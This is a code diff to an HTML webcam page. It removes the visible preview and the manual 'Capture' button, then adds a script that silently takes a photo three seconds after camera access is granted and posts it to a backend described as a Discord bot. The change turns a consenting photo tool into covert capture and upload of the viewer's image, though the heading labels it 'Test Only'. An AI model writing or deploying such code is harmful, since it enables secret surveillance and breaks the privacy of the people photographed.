@@ -1,31 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Camera Capture</title>
+  <title>Auto Webcam Capture</title>
 </head>
 <body>
-  <h1>Camera Access</h1>
-  <video id="video" autoplay></video>
-  <button onclick="takePhoto()">Capture</button>
+  <h1>Auto Capture (Test Only)</h1>
+  <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
-
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
+    const ctx = canvas.getContext('2d');
 
-    navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
-      video.srcObject = stream;
-    });
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
 
-    function takePhoto() {
+        // Wait for camera to be ready
+        video.onloadedmetadata = () => {
+          setTimeout(() => {
+            captureAndSend();
+          }, 3000); // 3 seconds after camera loads
+        };
+      } catch (err) {
+        console.error("Camera access denied:", err);
+      }
+    }
+
+    function captureAndSend() {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0);
-      const imageData = canvas.toDataURL('image/png');
-      alert("Photo captured (not uploaded)");
-      console.log(imageData); // You could POST this to a backend if allowed
+      ctx.drawImage(video, 0, 0);
+
+      const imageData = canvas.toDataURL("image/jpeg");
+      console.log("Captured Image:", imageData);
+
+      // POST to your Discord bot backend
+      fetch("http://localhost:3000/upload", {
+        method: "POST",
+        body: JSON.stringify({ image: imageData }),
+        headers: { "Content-Type": "application/json" }
+      });
     }
+
+    init();
   </script>
 </body>
 </html>
